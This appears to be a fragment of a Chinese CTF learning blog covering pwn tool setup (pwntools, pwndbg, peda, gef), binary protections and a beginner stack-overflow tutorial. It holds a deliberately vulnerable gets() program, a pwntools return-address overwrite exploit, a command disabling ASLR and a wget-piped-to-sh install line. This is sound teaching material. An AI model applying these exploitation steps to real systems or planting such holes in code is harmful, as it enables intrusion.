+<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.前提：python环境，同时需要装python-dev</span><br><span class="line">均使用apt安装的方式</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br><span class="line">sudo apt install python-dev</span><br><span class="line"></span><br><span class="line">2.pip安装（如果pip安装东西慢，可以换源(清华源)）</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/help/pypi/</span><br><span class="line"></span><br><span class="line">3.pwntools安装</span><br><span class="line">1、安装Capstone</span><br><span class="line">Capstone disassembly/disassembler framework: Core (Arm, Arm64, M68K, Mips, PPC, Sparc, SystemZ, X86, X86_64, XCore) + bindings (Python, Java, Ocaml)</span><br><span class="line"></span><br><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">2、安装pwntools</span><br><span class="line">在终端输入</span><br><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">python setup.py install</span><br><span class="line">如果没报错，并且终端输入python进入其交互模式后，输入import pwn回车后没报错，差不多就好了。</span><br><span class="line">这时候再尝试pwntools的asm功能</span><br><span class="line">&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)</span><br><span class="line">&apos;1\xc0&apos;</span><br><span class="line">如果有正确输出，即说明这个功能是可以用的，到这里就算安装完成。</span><br><span class="line"></span><br><span class="line">3.64位Ubuntu 16.04运行32位程序</span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt install libc6:i386</span><br></pre></td></tr></table></figure>
+<h2 id="checksec详解"><a href="#checksec详解" class="headerlink" title="checksec详解"></a>checksec详解</h2><p>checksec看到的那些参数含义</p>
+<ul>
+<li><p>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</p>
+</li>
+<li><p>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </p>
+</li>
+<li><p>ASLR</p>
+<p>Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code></p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+</li>
+<li><p>PIE</p>
+<p>在PIE没有开启的情况下，bss段的地址是固定的，所以，可以把shellcode写入bss段，然后跳转到bss段，然后执行shellcode。</p>
+</li>
+</ul>
+<h2 id="pwntools使用教程"><a href="#pwntools使用教程" class="headerlink" title="pwntools使用教程"></a>pwntools使用教程</h2><p>process 指向本地路径<br>remote(“IP”,port)指向地址还有端口<br>p64打包(可以吧数字转换到小端法)，u64解包(还原回去)<br>context.binary= 设置上下文<br>asm</p>
+<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 <code>c</code>). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
+<ul>
+<li><code>send(payload)</code> 发送payload</li>
+<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li>
+<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
+<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
+<li><code>recvline()</code> 接收一行输出</li>
+<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
+<li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li>
+</ul>
+<h1 id="gdb工具pwndbg与peda与gef配置"><a href="#gdb工具pwndbg与peda与gef配置" class="headerlink" title="gdb工具pwndbg与peda与gef配置"></a>gdb工具pwndbg与peda与gef配置</h1><p>在调试时有时候需要不同功能，在gdb下需要安装两个工具pwndbg和peda，可惜这两个不兼容</p>
+<p>pwndbg在调试堆的数据结构时候很方便</p>
+<p>peda在查找字符串等功能时方便</p>
+<p>安装pwndbg：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
+<p>安装peda：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure>
+<p>安装gef：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#自动安装</span><br><span class="line">$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line"></span><br><span class="line"># manually</span><br><span class="line">$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py</span><br><span class="line">$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<p>切换gdb的调试工具pwndbg或peda：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinitsource ~/peda/peda.py</span><br></pre></td></tr></table></figure>
+<p>把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda</p>
+<p>选中gef的话，即添加一行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
+<p>并把其他两行注释掉即可</p>
+<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>然后发现，只要把pwndbg放到最上边，然后其他的插件不用注释也都可以用了。</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85td64840j30gg06ywf5.jpg" alt="3.jpg"></p>
+<p>然后虽然显示gef，实际所有功能都有</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85tei4jztj30m906075u.jpg" alt="4.jpg"></p>
+<p>gdb切换工具 <a href="https://blog.csdn.net/aptx4869_li/article/details/81566541" target="_blank" rel="noopener">https://blog.csdn.net/aptx4869_li/article/details/81566541</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/22/常见函数与汇编指令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/22/常见函数与汇编指令/" itemprop="url">常见函数与汇编指令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-22T21:53:30+08:00">
+                2019-10-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><p>strcmp()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">参数 str1 和 str2 是参与比较的两个字符串。</span><br><span class="line">strcmp() 会根据  编码依次比较 str1 和 str2 的每一个字符，直到出现不到的字符，或者到达字符串末尾（遇见）。</span><br><span class="line">- 如果返回值 &lt; 0，则表示 str1 小于 str2。</span><br><span class="line">- 如果返回值 &gt; 0，则表示 str2 小于 str1。</span><br><span class="line">- 如果返回值 = 0，则表示 str1 等于 str2。</span><br><span class="line">such as；</span><br><span class="line">	 if(!strcmp(&amp;v10, &amp;v13))</span><br><span class="line">	 v13与v10进行比较，不相同时进入条件</span><br></pre></td></tr></table></figure>
+<p>strcpy()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strcpy(a, b)</span><br><span class="line">- 把b赋值给a</span><br></pre></td></tr></table></figure>
+<p>strcat()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcat(a1, a2)把a2拼接到a1，a1=a1+a2</span><br></pre></td></tr></table></figure>
+<p>memset(ch,0,sizeof(ch));</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*memset(void *buffer, int c, int count)</span><br><span class="line">- buffer指针或者是数组</span><br><span class="line">- c赋给buffer的数值</span><br><span class="line">- count指的是buffer的长度</span><br></pre></td></tr></table></figure>
+<p>execve()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">execve()用来执行参数filename字符串所代表的文件路径，第二个参数系利用数组指针来传递给执行文件，最后一个参数则为传递给执行文件的新环境变量数组</span><br><span class="line"></span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">　　main()</span><br><span class="line">　　&#123;</span><br><span class="line">　　char * argv[ ]=&#123;“ls”,”-al”,”/etc/passwd”,(char *)0&#125;;</span><br><span class="line">　　char * envp[ ]=&#123;“PATH=/bin”,0&#125;</span><br><span class="line">　　execve(“/bin/ls”,argv,envp);</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure>
+<p>read()和write()函数详解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write()函数有写文件和输出字符串这2种操作。</span><br></pre></td></tr></table></figure>
+<h2 id="汇编知识"><a href="#汇编知识" class="headerlink" title="汇编知识"></a>汇编知识</h2><p>xor ebx，ebx 相当于给ebx赋0</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/21/pwn入门学习(1)栈溢出基础知识/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/21/pwn入门学习(1)栈溢出基础知识/" itemprop="url">栈溢出基础知识</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-21T14:01:43+08:00">
+                2019-10-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x01栈的介绍"><a href="#0x01栈的介绍" class="headerlink" title="0x01栈的介绍"></a>0x01栈的介绍</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
+<p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/figure/Data_stack.png" alt="基本栈操作"></p>
+<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
+<h4 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h4><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
+<ul>
+<li>x86<ul>
+<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
+</ul>
+</li>
+<li><p>x64</p>
+<ul>
+<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
+<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
+</ul>
+<p>还有要注意的就是<code>64位</code>程序和<code>32位</code>程序的<strong>传参方式不一样</strong>，<strong>32位</strong>的函数调用<strong>使用栈传参</strong>，<strong>64位</strong>的函数调用<strong>使用寄存器传参</strong>，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。 </p>
+</li>
+</ul>
+<p>所以有时候·可以用ROPgadget工具，去查找pop rdi的地址</p>
+<h1 id="0x02栈溢出原理"><a href="#0x02栈溢出原理" class="headerlink" title="0x02栈溢出原理"></a>0x02栈溢出原理</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。 </p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<p>我们利用如下命令对其进行编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+0x27): 警告： the `gets&apos; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
+<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
+<blockquote>
+<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
+</blockquote>
+<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
+<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  stack-example checksec stack_example</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code></p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
+<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int vulnerable()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+4h] [bp-14h]@1</span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return puts(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0804843B success         proc near</span><br><span class="line">.text:0804843B                 push    ebp</span><br><span class="line">.text:0804843C                 mov     ebp, esp</span><br><span class="line">.text:0804843E                 sub     esp, 8</span><br><span class="line">.text:08048441                 sub     esp, 0Ch</span><br><span class="line">.text:08048444                 push    offset s        ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08048449                 call    _puts</span><br><span class="line">.text:0804844E                 add     esp, 10h</span><br><span class="line">.text:08048451                 nop</span><br><span class="line">.text:08048452                 leave</span><br><span class="line">.text:08048453                 retn</span><br><span class="line">.text:08048453 success         endp</span><br></pre></td></tr></table></figure>
+<p>那么如果我们读取的字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x14*&apos;a&apos;+&apos;bbbb&apos;+success_addr</span><br></pre></td></tr></table></figure>
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>
+<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">##coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">## 构造与程序交互的对象</span><br><span class="line">sh = process(&apos;./stack_example&apos;)</span><br><span class="line">success_addr = 0x0804843b</span><br><span class="line">## 构造payload</span><br><span class="line">payload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)</span><br><span class="line">print p32(success_addr)</span><br><span class="line">## 向程序发送字符串</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">## 将代码交互转换为手工交互</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
+<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
+<ul>
+<li>输入<ul>
+<li>gets，直接读取一行，忽略’\x00’</li>
+<li>scanf</li>
+<li>vscanf</li>
+</ul>
+</li>
+<li>输出<ul>
+<li>sprintf</li>
+</ul>
+</li>
+<li>字符串<ul>
+<li>strcpy，字符串复制，遇到’\x00’停止</li>
+<li>strcat，字符串拼接，遇到’\x00’停止</li>
+<li>bcopy</li>
+</ul>
+</li>
+</ul>
+<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/21/gdb工具pwndbg与peda与gef配置/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
